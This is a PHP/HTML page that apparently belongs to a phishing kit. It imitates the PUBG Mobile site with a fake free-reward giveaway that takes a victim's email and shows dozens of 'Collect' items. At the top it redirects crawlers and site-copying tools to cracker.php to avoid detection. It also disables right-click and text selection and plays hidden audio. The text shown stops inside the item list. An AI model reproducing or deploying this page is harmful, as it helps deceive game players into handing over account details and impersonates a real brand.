<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<iframe style="display: none;" scrolling="no" allow="autoplay" src="https://a.top4top.io/m_1936obt4j1.mp3" width="0" height="0" frameborder="no"></iframe>

<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-pay" src="https://www.pubgmobile.com/en/images/pay.png">
<button type="button"><img src="https://www.pubgmobile.com/en/images/down_arrow.png"> Download</button>
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<div class="slider">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- slider --->
</div> <!--- header --->
<div class="box">
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Weapon Reward</div>
</div> <!--- menu-wrapper --->
<div class="tab_rewards" id="latest">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/gZv6030/image.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/gZv6030/image.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/x5bybHC/2.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/x5bybHC/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mJwPfRC/3.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mJwPfRC/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/S5PvF3m/4.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/S5PvF3m/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/tXBHQtd/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tXBHQtd/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/C0rG8zv/11.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/C0rG8zv/11.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0hw5G8L/12.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0hw5G8L/12.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/6HyFpGG/13.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/6HyFpGG/13.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3dmRFXV/14.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3dmRFXV/14.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/zx5GxjL/15.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/zx5GxjL/15.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PhnrcY3/16.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PhnrcY3/16.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/g4z7tBb/17.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/g4z7tBb/17.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TTcnBSZ/18.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TTcnBSZ/18.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/t3P6YJy/19.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/t3P6YJy/19.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/yRTzG0t/20.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/yRTzG0t/20.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VSqw4Dv/21.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/VSqw4Dv/21.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0qVLP3y/22.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0qVLP3y/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N6sBxhr/23.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N6sBxhr/23.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/bgkqhSD/24.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/bgkqhSD/24.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PxpMQPv/25.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PxpMQPv/25.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/8gBrqKY/26.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/8gBrqKY/26.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YWbBt80/27.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YWbBt80/27.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BtztTC9/28.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BtztTC9/28.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/4d0jxMk/29.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/4d0jxMk/29.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hxGSqCR/30.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hxGSqCR/30.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6WSFLj/31.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c6WSFLj/31.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/yf3k2vw/32.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/yf3k2vw/32.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Zc4YWVk/33.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Zc4YWVk/33.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/D52fbJC/34.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/D52fbJC/34.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/T1yk8jX/35.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/T1yk8jX/35.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3kwbctw/36.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3kwbctw/36.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Fz96QgK/37.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Fz96QgK/37.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TcHpPz1/38.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TcHpPz1/38.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hXGJkjJ/39.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hXGJkjJ/39.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3F3vsBH/40.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3F3vsBH/40.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/J5bNTXt/41.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/J5bNTXt/41.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/FKjxq0p/42.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/FKjxq0p/42.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pbbpG2t/43.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pbbpG2t/43.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/D9XXLZs/44.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/D9XXLZs/44.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/xCXyt5Z/45.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/xCXyt5Z/45.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0h9Ytkz/46.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0h9Ytkz/46.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/2SN4jPv/47.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/2SN4jPv/47.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Thqqrh8/48.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Thqqrh8/48.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WK7qJN4/49.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WK7qJN4/49.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QnnT6p0/50.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/QnnT6p0/50.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DzQh8wS/51.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DzQh8wS/51.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/2s05KNn/52.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/2s05KNn/52.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pKy2mNR/53.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pKy2mNR/53.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BT3s0gQ/54.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BT3s0gQ/54.jpg">Collect</button>
</div>
</div>

<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qdC5zHF/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qdC5zHF/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mTpf1bz/3.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mTpf1bz/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pd4MrC6/4.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pd4MrC6/4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Xjjs6Mv/5.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Xjjs6Mv/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wwCwgFX/6.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wwCwgFX/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/sVkDgf7/8.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/sVkDgf7/8.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/7v7cDFb/9.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/7v7cDFb/9.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/m8swBsJ/5.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/m8swBsJ/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mqswmqy/6.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mqswmqy/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/RBm3cZg/8.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/RBm3cZg/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GkxtWsH/9.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/GkxtWsH/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hV80jRJ/11.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hV80jRJ/11.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TM4x8kF/12.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TM4x8kF/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3s4VjWb/13.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3s4VjWb/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Fb4WYn9/15.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Fb4WYn9/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wgC8DFJ/16.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wgC8DFJ/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/z7tRFnK/17.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/z7tRFnK/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mSR83ZX/18.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mSR83ZX/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/r01vx8L/19.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/r01vx8L/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BzkrJPx/20.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BzkrJPx/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KKsqN8c/21.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/KKsqN8c/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Ms6xmw1/22.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Ms6xmw1/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/nszjrmK/23.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/nszjrmK/23.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/C8XSXtp/24.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/C8XSXtp/24.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/XFvVdkm/25.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/XFvVdkm/25.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/42KvPQD/26.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/42KvPQD/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PztSxRq/27.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PztSxRq/27.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c1dyKJX/28.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c1dyKJX/28.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SQctySW/29.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/SQctySW/29.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HhxqcZy/30.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/HhxqcZy/30.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BG71Lq8/1.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BG71Lq8/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cYLYRnF/2.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cYLYRnF/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Kmzt1kv/3.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Kmzt1kv/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ySj37hj/4.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/ySj37hj/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/kh4gdrP/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/kh4gdrP/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ZBrkgM8/6.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/ZBrkgM8/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/ngP07s9/7.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/ngP07s9/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HGTx2s3/8.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/HGTx2s3/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mzb2f6V/9.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mzb2f6V/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QHRMWMg/10.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/QHRMWMg/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/G9M0Bvm/11.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/G9M0Bvm/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wMD34vP/12.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wMD34vP/12.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwWc8V7/13.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cwWc8V7/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0QtCjnz/14.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0QtCjnz/14.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/g9zWGn4/15.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/g9zWGn4/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/MnM6Qdp/16.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/MnM6Qdp/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rg2thNY/17.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Rg2thNY/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VQtZ0sH/18.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/VQtZ0sH/18.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/j3K6DSC/19.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/j3K6DSC/19.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WVQrH9j/20.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WVQrH9j/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/SrWTVzr/21.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/SrWTVzr/21.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YPXLK1h/22.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YPXLK1h/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/GWGX9DZ/23.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/GWGX9DZ/23.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Q8F2nX9/24.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Q8F2nX9/24.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Z6KDLDN/25.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Z6KDLDN/25.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N102xm6/26.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N102xm6/26.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/cwJRtR3/27.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/cwJRtR3/27.png">Collect</button>
</div>
